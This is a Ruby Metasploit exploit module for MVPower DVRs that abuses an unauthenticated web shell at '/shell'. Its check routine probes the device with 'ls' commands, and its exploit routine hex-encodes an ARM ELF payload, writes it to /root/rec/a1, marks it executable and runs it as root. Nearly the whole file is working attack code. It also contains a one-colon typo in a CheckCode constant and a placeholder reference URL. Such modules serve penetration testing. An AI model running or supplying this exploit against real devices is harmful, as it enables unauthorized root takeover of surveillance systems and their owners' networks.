require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'MVPower DVR Web Shell ',
            'Description'    => %q{
                This module leverages a web shell exposed by MVPower brand DVRs which allows for remote, unauthenticated command execution as root.
            },
            'Author'         => [ 'Kiernan Roche <self@kiernanro.ch>' ],
            'License'        => MSF_LICENSE,
            'References'     => [
                [ 'URL', 'https://www.pentestpartners.com/blog/pwning-cctv-cameras/' ],
                [ 'URL', 'https://www.kiernanro.ch/blog/some_post']
            ], # TODO: Add blog post url
            'Platform'       => 'linux',
            'Arch'           => ARCH_ARMLE,
            'Targets'        => [
                [ 'MVPower DVR', {} ]],
            'Payload'        =>
            {
                #'Space'   => "1024" # server will drop requests longer than 4096 characters. one payload byte = 4 characters in request.
            },
            'Privileged'     => false,
            'DisclosureDate' => "Feb 10 2016",
            'DefaultOptions' =>
            {
                'SHELL' => '/bin/ash'

            },
            'DefaultTarget'  => 0
        ))
        register_options([
            OptBool.new("ExitOnSession", [true, "Return from the exploit after a session has been created", false])
        ])

        register_advanced_options([
            OptInt.new("ListenerTimeout", [false, "The maximum number of seconds to wait for new sessions", 60])
        ], self.class)
    end

    def check
        print_status("Checking for web shell...")
        res = send_request_raw({
            'method'   => 'GET',
            'uri'      => '/shell?ls',
            'connection' => 'keep-alive'
        })

        if res && res.code == 200 && (res.to_s.include? "dvr_app")
            print_good("Web shell found.")
            print_status("Checking permissions...")
            
            res = send_request_raw({ # Check for shell
                'method'   => 'GET',
                'uri'      => '/shell?ls%20-al%20%2Froot%2Frec%2Fa1',
                'connection' => 'keep-alive'
            })

            if res && res.code == 200 && res.body.length > 0
                if res.body.split('\n').first.include? "drwx" # Check permissions of /root/rec/a1
                    print_good("/root/rec/a1 writeable and executable.")
                    return Msf::Exploit::CheckCode::Vulnerable
                else
                    print_error("/root/rec/a1 not accessible.")
                    return Msf::Exploit:CheckCode::Safe
                end
            else
                return Msf::Exploit::CheckCode::Safe
            end
        else
            print_error("No web shell found.")
            return Msf::Exploit::CheckCode::Unknown
        end
    end

    def exploit
        return if ((p = regenerate_payload) == nil)
        bin = Msf::Util::EXE.to_linux_armle_elf(Msf::Framework, p.encoded_exe, {}) #({ :code => p.encoded })
        pname = Rex::Text.rand_text_alpha(rand(6) + 1).downcase

        bin_encoded = ""

        for x in bin.each_byte.map { |b| b.to_s(16).rjust(2, '0') }
            bin_encoded += "%5Cx" + x # \x00
        end

        payload_uri = '/shell?cd%20%2Froot%2Frec%2Fa1%20%26%26%20echo%20-n%20-e%20%27' + # cd /root/rec/a1 && echo -n -e '
                      bin_encoded + # encoded payload in ELF binary
                      '%27%20%3E%20' + pname + # ' > pname
                      '%20%26%26%20chmod%20%2Bx%20' + pname + # && chmod +x pname
                      '%20%26%26%20.%2F' + pname #+ # && ./pname
                      #'%20%26%26%20ls' # &; ls
                      #'%20sleep%205%20%26%26%20rm%20' + pname # sleep 5 && rm pname 

        res = send_request_raw({
            'method'   => 'GET',
            'uri'      => payload_uri,
            'connection' => 'keep-alive'
        })

        #stime = Time.now.to_f
        #while (true)
            #break if session_created? && datastore['ExitOnSession']
            #break if res && res.code == 200
            #break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )
        #else
            #fail_with(Failure::None)
        #end
    end
end
